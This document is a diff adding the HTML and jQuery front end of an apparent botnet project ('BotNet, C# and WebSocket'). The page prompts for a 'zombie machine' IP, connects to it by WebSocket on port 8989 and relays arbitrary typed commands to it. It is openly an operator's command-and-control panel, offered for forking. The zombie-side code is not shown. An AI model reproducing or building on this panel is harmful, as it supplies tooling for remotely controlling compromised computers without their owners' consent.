@@ -1,0 +1,96 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistema Hackerzão</title>
+    <link href="Content/bootstrap-theme.min.css" rel="stylesheet" />
+    <link href="Content/bootstrap.min.css" rel="stylesheet" />
+</head>
+<body class="container">
+    <div style="margin-top: 100px">
+        <header>
+            <p>
+                <a href="https://github.com/kiide/BotnetWebSocket"><strong>Fork this project</strong></a>
+            </p>
+        </header>
+        <div class="panel panel panel-danger">
+            <div class="panel-heading">
+                <h3 class="panel-title">BotNet, C# and WebSocket</h3>
+            </div>
+            <div class="panel-body">
+                <section class="well-lg">
+                    <div class="form-group">
+                        <input type="button" id="connect" value="Connect" class="btn btn-success" />
+                        <input type="button" id="help" value="Show Commands" class="btn btn-info command" disabled="disabled" />
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="command" class="form-control command" disabled="disabled" />
+                    </div>
+                    <input type="button" id="send" value="Send" class="btn btn-default command" disabled="disabled" />
+                </section>
+            </div>
+            <div class="row">
+                <pre id="response" class="well col-md-10 col-md-offset-1"></pre>
+            </div>
+        </div>
+        <footer>
+            <p>
+                Develop by <strong>kide</strong>
+                <a href="https://twitter.com/_kiide">Twitter</a> |
+                <a href="https://github.com/kiide">Github</a>
+            </p>
+        </footer>
+    </div>
+    <script src="Scripts/jquery-1.9.0.min.js"></script>
+    <script src="Scripts/bootstrap.min.js"></script>
+    <script>
+        $(function () {
+            var connection;
+            $('#connect').click(function () {
+                // Request the ip for user
+                var ip = prompt("IP da máquina zumbi");
+                var porta = '8989';
+                if (!ip) return;
+                // Connect to server
+                connection = new WebSocket('ws://' + ip + ':' + porta);
+                $('#response').text('Trying to connect in ' + ip + ':' + porta);
+
+                // Event called when server send data
+                connection.onmessage = function (response) {
+                    var message = response.data;
+                    $('#response').text(message);
+                };
+                // Event called when connecting in server
+                connection.onopen = function (response) {
+                    $('.command').prop('disabled', false);
+                    var message = response.data;
+                    $('#response').text(message);
+                };
+
+                connection.onclose = function () {
+                    $('.command').prop('disabled', true);
+                    $('#response').text('Connection closed!');
+                };
+            });
+
+            $('#help').click(function () {
+                if (!connection) {
+                    alert('First connect in zombie');
+                    return;
+                }
+                connection.send('help');
+            });
+
+            $('#send').click(function () {
+                if (!connection) {
+                    alert('First connect in zombie');
+                    return;
+                }
+                var command = $('#command').val();
+                if (command) {
+                    connection.send(command);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
